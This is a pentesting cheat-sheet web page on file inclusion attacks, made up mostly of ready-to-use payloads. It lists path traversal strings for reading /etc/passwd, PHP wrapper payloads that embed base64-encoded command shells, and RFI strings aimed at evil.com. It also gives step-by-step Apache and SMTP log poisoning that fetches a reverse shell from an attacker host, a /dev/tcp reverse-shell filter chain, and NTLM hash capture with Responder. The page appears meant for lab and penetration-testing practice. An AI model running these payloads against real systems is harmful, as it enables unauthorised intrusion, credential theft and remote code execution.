<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>File Inclusion (LFI/RFI) | Exploit Notes</title>
  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');

    :root {
      --color-dark: #050A0E;
      --color-medium: #0D1B2A;
      --color-light: #1B263B;
      --color-neon-red: #FF073A;
      --color-text-light: #c0c7d6;
    }

    * {
      font-family: 'Fira Code', monospace;
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: var(--color-dark);
      color: var(--color-text-light);
      min-height: 100vh;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(rgba(255, 7, 58, 0.1), rgba(255, 7, 58, 0.05)), url('https://www.transparenttextures.com/patterns/3px-tile.png');
      z-index: -1;
      animation: moveBackground 5s linear infinite;
    }

    @keyframes moveBackground {
      from { background-position: 0 0; }
      to { background-position: 100px 100px; }
    }

    .content-wrapper {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
    }

    h1 {
      font-family: 'Press Start 2P', cursive;
      font-size: 24px;
      color: var(--color-neon-red);
      margin-bottom: 25px;
      animation: glitch 0.5s infinite alternate;
      text-align: center;
    }

    h2, h3 {
      color: var(--color-neon-red);
      margin: 20px 0;
      border-bottom: 2px solid var(--color-neon-red);
      padding-bottom: 10px;
      text-align: left;
    }

    p {
      margin: 15px 0;
      line-height: 1.6;
      text-align: justify;
    }

    pre, code {
      background: var(--color-medium);
      padding: 15px;
      border-radius: 5px;
      font-size: 14px;
      color: var(--color-neon-red);
      border: 2px solid var(--color-neon-red);
      margin: 15px 0;
      line-height: 1.5;
      white-space: pre-wrap;
      word-wrap: break-word;
      overflow: hidden;
    }

    strong {
      font-weight: bold;
      color: var(--color-neon-red);
    }

    ::-webkit-scrollbar {
      display: none;
    }

    pre {
      max-width: 100%;
    }

    code {
      display: block;
      padding: 1em;
    }

    .content-wrapper a {
      color: var(--color-neon-red);
      text-decoration: none;
    }

    .content-wrapper a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="content-wrapper">
    <br>
    <br>
    <h1>File Inclusion (LFI/RFI)</h1>
    <p>Local File Inclusion (LFI) and Remote File Inclusion (RFI) are vulnerabilities that are often found to affect web applications that rely on a scripting run time.</p>
    <h2>Local File Inclusion (LFI)</h2>
    
    <pre><code>?page=../
?page=/etc/passwd
?page=../../../../etc/passwd
?page=../../../../../etc/passwd
?page=..././..././..././..././etc/passwd
?page=..//..//..//..//..//etc/passwd
?page=....//....//....//....//etc/passwd
?page=....//....//....//....//....//....//etc/passwd
?page=.....///.....///.....///.....///etc/passwd
?page=../../../../../../../../../../../../../../etc/passwd
?page=..\/..\/..\/..\/etc/passwd
?page=/var/www/html/..//..//..//etc/passwd
?page=/etc/passwd&
?page=/etc/passwd%00
?page=example.php%00.txt
?page=/etc/passwd%00.inc
?page=/etc/passwd%00.php
?page=http://localhost/index
?page=http://localhost:3000/index.html
?page=http://localhost:8000/index.html
?page=somedir/../../../../etc/passwd&ext=</code></pre>

    <h3>URL encoding</h3>
    <pre><code>?page=..%2F..%2F..%2F..%2Fetc/passwd
?page=..%5C..%5C..%5C..%5Cetc/passwd
?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
?page=http:%5C%5Cindex
?page=..%252F..%252F..%252F..%252fetc/passwd
?page=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
?page=http:%252F%252Findex
?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
?page=../../../../etc/passwd
?page=file:///etc/passwd
?page=file:%2F%2F%2Fetc%2Fpasswd
?page=file:%252F%252F%252Fetc%252Fpasswd
?page=file%3A///etc/passwd
?page=file%3A%2F%2F%2Fetc%2Fpasswd
?page=file%3A%252F%252F%252Fetc%252Fpasswd
?page=file://var/www/html/index.php
?page=file://var/www/&lt;subdomain&gt;/index.php
?page=http://127.0.0.1/
?page=http://127.0.0.1:3000/
?page=http://127.0.0.1:8000/
?page=php://filter/resource=/etc/passwd
?page=php://filter/read=string.rot13/resource=index.php
?page=php://filter/convert.base64-encode/resource=index.php
?page=pHp://filter/convert.base64-encode/resource=index.php
?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
?page=data://text/plain,&lt;?php echo base64_encode(file_get_contents("index.php")); ?&gt;
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=whoami
?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=&cmd=whoami
?page=/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;</code></pre>

    <p>To automate this process, we can fuzzing as follow.</p>
    <pre><code>ffuf -u http://example.com/?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
ffuf -u http://example.com/?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</code></pre>

    <h2>Remote File Inclusion (RFI)</h2>
    <pre><code>?page=//evil.com/exploit
?page=%2F%2fevil.com/exploit
?page=%2C%2Cevil.com/exploit
?page=http://evil.com/exploit
?page=http%3A//evil.com/exploit
?page=http%3A%2F%2Fevil%2Ecom/exploit
?page=http%253A%252F%252Fevil%252Ecom/
?page=test@sub.example.com/</code></pre>

    <h3>Steal NTLM Hashes (Windows)</h3>
    <p>If the website is hosted on Windows, we may be able to retrieve password hashes using Responder.</p>
    <p>In local machine, start responder.</p>
    <pre><code>sudo responder -I tun0</code></pre>
    <p>Then send request to <code>https://example.com/?page=//local-ip/test</code></p>
    <p>Now we may be able to capture the hashes.</p>
    <p>If so, we can crack it using JohnTheRipper or Hashcat. Please refer to this page for cracking NTLM.</p>

    <h2>Remote Code Execution (RCE)</h2>
    <p>php_filter_chain_generator is CLI that generates payload for PHP filter bypass and allow us to RCE.</p>
    <p>Below is the payload for reverse shell.</p>
    <pre><code>wget https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py
python3 php_filter_chain_generator.py --chain "&lt;?php system('bash -c \"bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1\"')?&gt;"</code></pre>
    <p>Then copy the output and paste it to the target.</p>

    <h2>Log Poisoning</h2>
    <h3>1. Check if You Can Access the Apache Log File</h3>
    <pre><code>/?page=/var/log/apache/access.log
/?page=../../../../var/log/apache/access.log
/?page=/var/log/apache2/access.log
/?page=../../../../var/log/apache2/access.log
/?page=/var/log/httpd-access.log
/?page=../../../../var/log/httpd-access.log
/?page=/var/log/httpd/access_log
/?page=../../../../var/log/httpd/access_log</code></pre>

    <h3>2. Prepare the Payload for PHP Reverse Shell</h3>
    <pre><code>wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php

$ip = '&lt;attacker-ip&gt;';
$port = 4444;</code></pre>

    <h3>3. Open Web Server in Local Machine</h3>
    <pre><code>python -m http.server 80</code></pre>

    <h3>4. Inject PHP Payload in the User-Agent</h3>
    <p>Send the GET Request with abusing the User-Agent.</p>
    <p>The payload can be uploaded to the <code>/shell.php</code> of the target website.</p>
    <pre><code>GET / HTTP/1.1
...
User-Agent: &lt;?php file_put_contents('shell.php', file_get_contents('http://&lt;attacker-ip&gt;/shell.php'));  ?&gt;</code></pre>
    <p>If we got some error such as "500 Internal Server Error" when the next steps, try to modify the payload a bit. For example,</p>
    <ul>
      <li>Change single quotes (') to double quotes (").</li>
      <li>Change double quotes (") to single quotes (').</li>
      <li>Change <code>&lt;?php</code> to <code>&lt;?pHp</code>(PHP filter bypass)</li>
    </ul>

    <h3>5. Apply the Injection</h3>
    <p>Refresh the page <code>/index.php?page=../../../../var/log/apache2/access.log</code></p>

    <h3>6. Open Listener for Reverse Shell</h3>
    <p>In your local machine, open the listener.</p>
    <p>You need to specify the port which you set in section 2.</p>
    <pre><code>nc -lvnp 4444</code></pre>

    <h3>7. Gain Access to Shell</h3>
    <p>Access to <code>/shell.php</code> of the target website.</p>
    <p>If it goes well, you can get a shell.</p>

    <h2>SMTP Log Poisoning</h2>
    <p>Reference: <a href="https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/">https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/</a></p>
    <p>If the target system opens SMTP and we can see the email logs, we may inject arbitrary code to the email log and lead to RCE.</p>

    <h3>1. Check Log Files with LFI</h3>
    <p>Below is the log file location examples:</p>
    <pre><code># Exim
?page=/var/log/exim_mainlog
?page=/var/log/exim/main.log

# Postfix
?page=/var/log/mail.log
?page=/var/log/maillog
?page=/var/adm/maillog
?page=/var/adm/syslog/mail.log</code></pre>

    <h3>2. Send Email Included RCE via SMTP Server</h3>
    <pre><code># 1. Connect to the SMTP server
telnet x.x.x.x 25

# 2. Check existing account
vrfy root
250 2.0.0 root
vrfy admin
250 2.0.0 admin
vrfy administrator
250 2.0.0 administrator
...

# 3. Send email included arbitrary code
MAIL FROM: support@victim.com
RCPT TO: &lt;?php system($_GET['cmd']); ?&gt;</code></pre>

    <h3>3. Achieve RCE with LFI</h3>
    <p>Now go back to the vulnerable web page. Send request of LFI such as below:</p>
    <pre><code>/?page=/var/log/mail.log&cmd=whoami</code></pre>
    <p>If the result of the system command is displayed in the response, we can execute other commands (e.g. for Reverse Shell).</p>
    <h2>Labs</h2>
    <p>Local File inclusion: <a href="https://www.root-me.org/fr/Challenges/Web-Serveur/Local-File-Inclusion">Root-me</a></p>
    <p>Local File Inclusion - Double encoding: <a href="https://www.root-me.org/fr/Challenges/Web-Serveur/Local-File-Inclusion-Double-encoding">Root-me</a></p>
    <p>Local File Inclusion - Wrappers: <a href="https://www.root-me.org/fr/Challenges/Web-Serveur/Local-File-Inclusion-Wrappers">Root-me</a></p>
    <p>File path traversal, validation of start of path: <a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path">Port-Swigger</a></p>
  </div>
</body>
</html>
